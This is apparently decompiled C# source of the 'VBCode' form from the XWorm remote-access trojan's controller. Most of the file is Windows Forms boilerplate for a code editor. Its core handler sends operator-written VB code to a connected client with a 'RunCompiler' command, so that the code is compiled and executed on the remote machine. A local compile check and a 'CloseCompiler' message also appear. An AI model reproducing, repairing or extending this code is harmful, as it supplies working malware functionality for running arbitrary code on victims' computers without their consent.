using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using FastColoredTextBoxNS;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000033 RID: 51
	[DesignerGenerated]
	public partial class VBCode : Form
	{
		// Token: 0x06000954 RID: 2388 RVA: 0x00051930 File Offset: 0x0004FB30
		public VBCode()
		{
			base.Load += this.VBCode_Load;
			base.FormClosing += this.VBCode_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x1700036C RID: 876
		// (get) Token: 0x06000957 RID: 2391 RVA: 0x000529D8 File Offset: 0x00050BD8
		// (set) Token: 0x06000958 RID: 2392 RVA: 0x000529E2 File Offset: 0x00050BE2
		internal virtual FastColoredTextBox editor { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700036D RID: 877
		// (get) Token: 0x06000959 RID: 2393 RVA: 0x000529EB File Offset: 0x00050BEB
		// (set) Token: 0x0600095A RID: 2394 RVA: 0x000529F5 File Offset: 0x00050BF5
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700036E RID: 878
		// (get) Token: 0x0600095B RID: 2395 RVA: 0x000529FE File Offset: 0x00050BFE
		// (set) Token: 0x0600095C RID: 2396 RVA: 0x00052A08 File Offset: 0x00050C08
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripStatusLabel1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel1_Click);
				ToolStripStatusLabel toolStripStatusLabel = this._ToolStripStatusLabel1;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click -= value2;
				}
				this._ToolStripStatusLabel1 = value;
				toolStripStatusLabel = this._ToolStripStatusLabel1;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click += value2;
				}
			}
		}

		// Token: 0x1700036F RID: 879
		// (get) Token: 0x0600095D RID: 2397 RVA: 0x00052A4B File Offset: 0x00050C4B
		// (set) Token: 0x0600095E RID: 2398 RVA: 0x00052A55 File Offset: 0x00050C55
		internal virtual ListBox ListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000370 RID: 880
		// (get) Token: 0x0600095F RID: 2399 RVA: 0x00052A5E File Offset: 0x00050C5E
		// (set) Token: 0x06000960 RID: 2400 RVA: 0x00052A68 File Offset: 0x00050C68
		internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000371 RID: 881
		// (get) Token: 0x06000961 RID: 2401 RVA: 0x00052A71 File Offset: 0x00050C71
		// (set) Token: 0x06000962 RID: 2402 RVA: 0x00052A7C File Offset: 0x00050C7C
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x17000372 RID: 882
		// (get) Token: 0x06000963 RID: 2403 RVA: 0x00052ABF File Offset: 0x00050CBF
		// (set) Token: 0x06000964 RID: 2404 RVA: 0x00052AC9 File Offset: 0x00050CC9
		internal virtual Panel Panel5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000373 RID: 883
		// (get) Token: 0x06000965 RID: 2405 RVA: 0x00052AD2 File Offset: 0x00050CD2
		// (set) Token: 0x06000966 RID: 2406 RVA: 0x00052ADC File Offset: 0x00050CDC
		internal virtual Guna2Panel Guna2Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000374 RID: 884
		// (get) Token: 0x06000967 RID: 2407 RVA: 0x00052AE5 File Offset: 0x00050CE5
		// (set) Token: 0x06000968 RID: 2408 RVA: 0x00052AF0 File Offset: 0x00050CF0
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x17000375 RID: 885
		// (get) Token: 0x06000969 RID: 2409 RVA: 0x00052B33 File Offset: 0x00050D33
		// (set) Token: 0x0600096A RID: 2410 RVA: 0x00052B3D File Offset: 0x00050D3D
		internal virtual Guna2Panel Guna2Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000376 RID: 886
		// (get) Token: 0x0600096B RID: 2411 RVA: 0x00052B46 File Offset: 0x00050D46
		// (set) Token: 0x0600096C RID: 2412 RVA: 0x00052B50 File Offset: 0x00050D50
		internal virtual Guna2Panel Guna2Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000377 RID: 887
		// (get) Token: 0x0600096D RID: 2413 RVA: 0x00052B59 File Offset: 0x00050D59
		// (set) Token: 0x0600096E RID: 2414 RVA: 0x00052B63 File Offset: 0x00050D63
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000378 RID: 888
		// (get) Token: 0x0600096F RID: 2415 RVA: 0x00052B6C File Offset: 0x00050D6C
		// (set) Token: 0x06000970 RID: 2416 RVA: 0x00052B78 File Offset: 0x00050D78
		internal virtual ToolStripMenuItem AddToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._AddToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.AddToolStripMenuItem1_Click);
				ToolStripMenuItem addToolStripMenuItem = this._AddToolStripMenuItem1;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click -= value2;
				}
				this._AddToolStripMenuItem1 = value;
				addToolStripMenuItem = this._AddToolStripMenuItem1;
				if (addToolStripMenuItem != null)
				{
					addToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000379 RID: 889
		// (get) Token: 0x06000971 RID: 2417 RVA: 0x00052BBB File Offset: 0x00050DBB
		// (set) Token: 0x06000972 RID: 2418 RVA: 0x00052BC8 File Offset: 0x00050DC8
		internal virtual ToolStripMenuItem RemoveToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RemoveToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoveToolStripMenuItem1_Click);
				ToolStripMenuItem removeToolStripMenuItem = this._RemoveToolStripMenuItem1;
				if (removeToolStripMenuItem != null)
				{
					removeToolStripMenuItem.Click -= value2;
				}
				this._RemoveToolStripMenuItem1 = value;
				removeToolStripMenuItem = this._RemoveToolStripMenuItem1;
				if (removeToolStripMenuItem != null)
				{
					removeToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700037A RID: 890
		// (get) Token: 0x06000973 RID: 2419 RVA: 0x00052C0B File Offset: 0x00050E0B
		// (set) Token: 0x06000974 RID: 2420 RVA: 0x00052C15 File Offset: 0x00050E15
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700037B RID: 891
		// (get) Token: 0x06000975 RID: 2421 RVA: 0x00052C1E File Offset: 0x00050E1E
		// (set) Token: 0x06000976 RID: 2422 RVA: 0x00052C28 File Offset: 0x00050E28
		internal virtual Guna2ContextMenuStrip Guna2ContextMenuStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700037C RID: 892
		// (get) Token: 0x06000977 RID: 2423 RVA: 0x00052C31 File Offset: 0x00050E31
		// (set) Token: 0x06000978 RID: 2424 RVA: 0x00052C3C File Offset: 0x00050E3C
		internal virtual ToolStripMenuItem CutToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._CutToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CutToolStripMenuItem1_Click);
				ToolStripMenuItem cutToolStripMenuItem = this._CutToolStripMenuItem1;
				if (cutToolStripMenuItem != null)
				{
					cutToolStripMenuItem.Click -= value2;
				}
				this._CutToolStripMenuItem1 = value;
				cutToolStripMenuItem = this._CutToolStripMenuItem1;
				if (cutToolStripMenuItem != null)
				{
					cutToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700037D RID: 893
		// (get) Token: 0x06000979 RID: 2425 RVA: 0x00052C7F File Offset: 0x00050E7F
		// (set) Token: 0x0600097A RID: 2426 RVA: 0x00052C8C File Offset: 0x00050E8C
		internal virtual ToolStripMenuItem CopyToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._CopyToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem1_Click);
				ToolStripMenuItem copyToolStripMenuItem = this._CopyToolStripMenuItem1;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem1 = value;
				copyToolStripMenuItem = this._CopyToolStripMenuItem1;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700037E RID: 894
		// (get) Token: 0x0600097B RID: 2427 RVA: 0x00052CCF File Offset: 0x00050ECF
		// (set) Token: 0x0600097C RID: 2428 RVA: 0x00052CDC File Offset: 0x00050EDC
		internal virtual ToolStripMenuItem PasteToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._PasteToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PasteToolStripMenuItem1_Click);
				ToolStripMenuItem pasteToolStripMenuItem = this._PasteToolStripMenuItem1;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click -= value2;
				}
				this._PasteToolStripMenuItem1 = value;
				pasteToolStripMenuItem = this._PasteToolStripMenuItem1;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700037F RID: 895
		// (get) Token: 0x0600097D RID: 2429 RVA: 0x00052D1F File Offset: 0x00050F1F
		// (set) Token: 0x0600097E RID: 2430 RVA: 0x00052D2C File Offset: 0x00050F2C
		internal virtual ToolStripMenuItem ToolStripMenuItem7
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem7;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem7_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem7 = value;
				toolStripMenuItem = this._ToolStripMenuItem7;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000380 RID: 896
		// (get) Token: 0x0600097F RID: 2431 RVA: 0x00052D6F File Offset: 0x00050F6F
		// (set) Token: 0x06000980 RID: 2432 RVA: 0x00052D7C File Offset: 0x00050F7C
		internal virtual ToolStripMenuItem ErrorTestToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ErrorTestToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ErrorTestToolStripMenuItem_Click);
				ToolStripMenuItem errorTestToolStripMenuItem = this._ErrorTestToolStripMenuItem;
				if (errorTestToolStripMenuItem != null)
				{
					errorTestToolStripMenuItem.Click -= value2;
				}
				this._ErrorTestToolStripMenuItem = value;
				errorTestToolStripMenuItem = this._ErrorTestToolStripMenuItem;
				if (errorTestToolStripMenuItem != null)
				{
					errorTestToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000981 RID: 2433 RVA: 0x00052DC0 File Offset: 0x00050FC0
		private void VBCode_Load(object sender, EventArgs e)
		{
			try
			{
				this.editor.Text = Resources.VBCode;
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000982 RID: 2434 RVA: 0x00052E10 File Offset: 0x00051010
		public void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
		{
			try
			{
				new Dictionary<string, string>().Add("CompilerVersion", "v4.0");
				string compilerOptions = "/target:winexe /platform:anycpu /optimize-";
				CompilerParameters options = new CompilerParameters(referencedAssemblies)
				{
					GenerateExecutable = true,
					GenerateInMemory = true,
					CompilerOptions = compilerOptions,
					TreatWarningsAsErrors = false,
					IncludeDebugInformation = false
				};
				CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(options, new string[]
				{
					source
				});
				bool flag = compilerResults.Errors.Count > 0;
				if (flag)
				{
					try
					{
						IEnumerator enumerator = compilerResults.Errors.GetEnumerator();
						if (enumerator.MoveNext())
						{
							CompilerError compilerError = (CompilerError)enumerator.Current;
							MessageBox.Show(compilerError.ErrorText + Environment.NewLine + Conversions.ToString(compilerError.Line), this.Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				else
				{
					MessageBox.Show("No Error!", this.Text, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		// Token: 0x06000983 RID: 2435 RVA: 0x00052F60 File Offset: 0x00051160
		private void ToolStripStatusLabel1_Click(object sender, EventArgs e)
		{
			this.ToolStripStatusLabel1.Visible = false;
			this.ToolStripStatusLabel1.Text = null;
		}

		// Token: 0x06000984 RID: 2436 RVA: 0x00052F80 File Offset: 0x00051180
		private void VBCode_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseCompiler");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000985 RID: 2437 RVA: 0x00052FC0 File Offset: 0x000511C0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000986 RID: 2438 RVA: 0x00053018 File Offset: 0x00051218
		private void AddToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Add Reference", "References", "", -1, -1);
			bool flag = text.Length == 0 | this.ListBox1.Items.Contains(text);
			if (!flag)
			{
				this.ListBox1.Items.Add(text);
			}
		}

		// Token: 0x06000987 RID: 2439 RVA: 0x00053074 File Offset: 0x00051274
		private void RemoveToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				this.ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(this.ListBox1.SelectedItem));
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000988 RID: 2440 RVA: 0x000530D4 File Offset: 0x000512D4
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = !string.IsNullOrEmpty(this.editor.Text);
				if (flag)
				{
					string text = null;
					try
					{
						foreach (object obj in this.ListBox1.Items)
						{
							object objectValue = RuntimeHelpers.GetObjectValue(obj);
							text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(objectValue, ",")));
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"RunCompiler",
						SettingsHelper.SPL,
						this.editor.Text,
						SettingsHelper.SPL,
						text.Trim().TrimEnd(new char[]
						{
							','
						})
					}));
					VBCode._Closure$__R96-2 CS$<>8__locals1 = new VBCode._Closure$__R96-2(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000989 RID: 2441 RVA: 0x00053214 File Offset: 0x00051414
		private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				this.editor.Cut();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600098A RID: 2442 RVA: 0x00053260 File Offset: 0x00051460
		private void CopyToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				Clipboard.SetText(this.editor.SelectedText);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600098B RID: 2443 RVA: 0x000532B0 File Offset: 0x000514B0
		private void PasteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				this.editor.SelectedText = Clipboard.GetText();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600098C RID: 2444 RVA: 0x00053300 File Offset: 0x00051500
		private void ToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			int num = (int)MessageBox.Show("Are You Sure?", "Clear!", MessageBoxButtons.YesNo);
			bool flag = num == 6;
			if (flag)
			{
				this.editor.Clear();
			}
		}

		// Token: 0x0600098D RID: 2445 RVA: 0x00053338 File Offset: 0x00051538
		private void ErrorTestToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Dictionary<string, string> providerOptions = new Dictionary<string, string>
			{
				{
					"CompilerVersion",
					"v4.0"
				}
			};
			string text = null;
			try
			{
				foreach (object obj in this.ListBox1.Items)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(obj);
					text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(objectValue, ",")));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.Compiler(new VBCodeProvider(providerOptions), this.editor.Text, text.Trim().TrimEnd(new char[]
			{
				','
			}).Split(new string[]
			{
				","
			}, StringSplitOptions.RemoveEmptyEntries));
		}

		// Token: 0x040003FB RID: 1019
		public Client C;
	}
}
